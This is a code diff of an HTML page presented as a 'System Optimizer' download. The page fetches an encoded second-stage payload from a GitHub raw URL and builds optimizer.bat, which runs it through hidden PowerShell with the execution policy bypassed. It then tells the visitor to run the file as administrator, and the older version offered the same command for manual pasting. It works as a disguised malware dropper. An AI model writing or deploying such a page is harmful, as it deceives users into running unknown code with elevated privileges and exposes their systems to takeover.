@@ -1,44 +1,43 @@
 <!DOCTYPE html>
 <html>
-
 <head>
-    <title>System Tools</title>
+    <title>System Optimizer</title>
     <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <style>
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
         }
-
         body {
-            font-family: system-ui;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
             background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
             min-height: 100vh;
             display: flex;
             justify-content: center;
             align-items: center;
+            padding: 20px;
         }
-
         .card {
             background: white;
             padding: 50px;
             border-radius: 20px;
-            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
+            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
             text-align: center;
             max-width: 500px;
+            width: 100%;
         }
-
         h1 {
             color: #333;
             margin-bottom: 15px;
+            font-size: 28px;
         }
-
         p {
             color: #666;
             margin-bottom: 30px;
+            line-height: 1.6;
         }
-
         .btn {
             padding: 15px 40px;
             background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
@@ -47,131 +46,95 @@
             border-radius: 50px;
             font-size: 16px;
             cursor: pointer;
-            margin: 10px;
+            font-weight: 600;
+            transition: transform 0.2s, box-shadow 0.2s;
         }
-
         .btn:hover {
             transform: translateY(-2px);
-            box-shadow: 0 10px 20px rgba(0, 0, 0, 0.2);
+            box-shadow: 0 10px 20px rgba(0,0,0,0.2);
         }
-
-        textarea {
-            width: 100%;
-            height: 150px;
+        .icon {
+            font-size: 64px;
+            margin-bottom: 20px;
+        }
+        .status {
+            margin-top: 20px;
             padding: 15px;
-            margin: 15px 0;
-            font-family: monospace;
-            font-size: 11px;
-        }
-
-        .instructions {
-            background: #fff3cd;
-            padding: 20px;
             border-radius: 10px;
-            margin-top: 15px;
-            text-align: left;
+            font-size: 14px;
         }
-
-        .hidden {
-            display: none;
+        .status.loading {
+            background: #fff3cd;
+            color: #856404;
+        }
+        .status.success {
+            background: #d4edda;
+            color: #155724;
+        }
+        .status.error {
+            background: #f8d7da;
+            color: #721c24;
         }
     </style>
 </head>
-
 <body>
     <div class="card">
-        <div style="font-size: 64px; margin-bottom: 20px;">⚡</div>
-        <button class="btn" onclick="showAuto()">Auto Download</button>
-        <button class="btn" onclick="showManual()">Manual Copy</button>
-
-        <div id="content"></div>
+        <div class="icon">⚡</div>
+        <h1>System Optimizer</h1>
+        <p>Download and run the optimization tool to enhance system performance</p>
+        <button class="btn" onclick="downloadOptimizer()">📥 Download Optimizer</button>
+        <div id="status"></div>
     </div>
-
+    
     <script>
-        const GITHUB_USER = 'icecold169';
-        const GITHUB_REPO = 'rtcp';
-        const RAW_URL = `https://raw.githubusercontent.com/icecold169/rtcp/main/stage2.txt`;
-
-        let payload = null;
-
-        async function loadPayload() {
-            if (payload) return;
-            try {
+    const RAW_URL = 'https://raw.githubusercontent.com/icecold169/rtcp/main/stage2.txt';
+    let payload = null;
+    
+    // Preload payload
+    (async function preload() {
+        try {
+            const res = await fetch(RAW_URL);
+            payload = await res.text();
+        } catch (e) {
+            console.error('Preload failed:', e);
+        }
+    })();
+    
+    async function downloadOptimizer() {
+        const statusDiv = document.getElementById('status');
+        statusDiv.className = 'status loading';
+        statusDiv.textContent = '⏳ Preparing download...';
+        
+        try {
+            // Load payload if not preloaded
+            if (!payload) {
+                statusDiv.textContent = '⏳ Downloading components...';
                 const res = await fetch(RAW_URL);
                 payload = await res.text();
-            } catch (e) {
-                alert('Error loading payload. Check your internet connection.');
             }
-        }
-
-        loadPayload();
-
-        function showAuto() {
-            document.getElementById('content').innerHTML = `
-            <div style="margin-top: 30px;">
-                <h3>Auto Download</h3>
-                <button class="btn" onclick="download()">Download</button>
-            </div>
-        `;
-        }
-
-        function showManual() {
-            document.getElementById('content').innerHTML = `
-            <div style="margin-top: 30px;">
-                <h3>Manual Copy</h3>
-                <textarea id="code" readonly onclick="this.select()">Loading...</textarea>
-                <button class="btn" onclick="copy()">Copy</button>
-            </div>
-        `;
-            generateCode();
-        }
-
-        async function generateCode() {
-            if (!payload) await loadPayload();
-            if (!payload) {
-                document.getElementById('code').value = 'ERROR: Cannot load';
-                return;
-            }
-
-            document.getElementById('code').value = `@echo off
-                powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand ${payload}
-                exit /b`;
-        }
-
-        async function download() {
-            const status = document.getElementById('status');
-            if (!payload) {
-                status.innerHTML = '<div style="color: red;">Loading...</div>';
-                await loadPayload();
-            }
-
-            if (!payload) {
-                status.innerHTML = '<div style="color: red;">Error: Cannot load</div>';
-                return;
-            }
-
-            const bat = `@echo off
-                powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand ${payload}
-                exit /b`;
-
-            const blob = new Blob([bat], { type: 'text/plain' });
+            
+            // Create batch file
+            const batContent = `@echo off
+powershell.exe -WindowStyle Hidden -NoProfile -NonInteractive -ExecutionPolicy Bypass -EncodedCommand ${payload}
+exit`;
+            
+            // Download
+            const blob = new Blob([batContent], { type: 'text/plain' });
             const url = URL.createObjectURL(blob);
             const a = document.createElement('a');
             a.href = url;
             a.download = 'optimizer.bat';
             a.click();
             URL.revokeObjectURL(url);
-
-            status.innerHTML = '<div style="color: green; margin-top: 15px;">✓ Downloaded!</div>';
+            
+            statusDiv.className = 'status success';
+            statusDiv.innerHTML = '✅ Downloaded!<br><br><b>Instructions:</b><br>1. Right-click optimizer.bat<br>2. Select "Run as administrator"<br>3. Wait for completion';
+            
+        } catch (e) {
+            statusDiv.className = 'status error';
+            statusDiv.textContent = '❌ Error: ' + e.message;
         }
-
-        function copy() {
-            const textarea = document.getElementById('code');
-            textarea.select();
-            document.execCommand('copy');
-            alert('✓ Copied to clipboard! Now paste into Notepad.');
-        }
+    }
     </script>
 </body>
-
 </html>
